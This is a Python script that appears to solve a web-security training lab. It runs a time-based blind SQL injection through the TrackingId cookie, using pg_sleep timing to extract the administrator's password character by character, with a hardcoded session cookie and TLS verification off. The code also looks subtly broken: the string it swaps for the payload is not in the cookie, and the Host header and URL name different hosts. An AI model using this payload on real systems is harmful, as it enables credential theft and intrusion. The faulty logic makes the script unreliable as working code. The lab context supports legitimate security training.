import requests
import time
headers = {
    'Host': '0a2b005d04913b5b82aa9cd7002b00cb.web-security-academy.net',
    'Cookie': 'TrackingId=GXHt2MCQVa1USlZb; session=wmXWd97w4X9nn0Gn8AmHlgdVujHvTJbS',
    'Sec-Ch-Ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Linux"',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://0a2b005d04913b5b82aa9cd7002b00cb.web-security-academy.net/login',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}
proxies = {'http':'http://127.0.0.1:8081','https':'http://127.0.0.1:8081'}
url = 'https://0aff00a90388e11f80d6819d009b0095.web-security-academy.net/'
password = ""

for i in range(20):
    for char in range(ord('a'), ord('z') + 1):
        temp = chr(char)
        new_tracking_id = f"oKEd5LIAzX2IIrUC'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i+1},1)='{temp}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
        print(new_tracking_id)
        headers['Cookie'] = headers['Cookie'].replace('oKEd5LIAzX2IIrUC', f'{new_tracking_id}')

        start_time = time.time()
        response = requests.get(url, headers=headers,proxies=proxies,verify=False)
        end_time = time.time()

        response_time = end_time - start_time
        print(response.status_code)
        print(response_time)

        if response_time > 10:
            password += temp
            response_time = 0
        headers['Cookie'] = headers['Cookie'].replace( f'{new_tracking_id}','oKEd5LIAzX2IIrUC')


    origincookie='TrackingId=oKEd5LIAzX2IIrUC'
    for digit in range(ord('0'), ord('9') + 1):
        new_tracking_id = f"oKEd5LIAzX2IIrUC'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{i+1},1)='{chr(digit)}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
        print(new_tracking_id)
        headers['Cookie'] = headers['Cookie'].replace('oKEd5LIAzX2IIrUC', f'{new_tracking_id}')

        start_time = time.time()
        response = requests.get(url, headers=headers,proxies=proxies,verify=False)
        end_time = time.time()

        response_time = end_time - start_time
        print(response.status_code)
        print(response_time)

        if response_time > 10:
            password += chr(digit)
            response_time = 0
        headers['Cookie'] = headers['Cookie'].replace( f'{new_tracking_id}','oKEd5LIAzX2IIrUC')

print("Password:", password)
print(response.text)
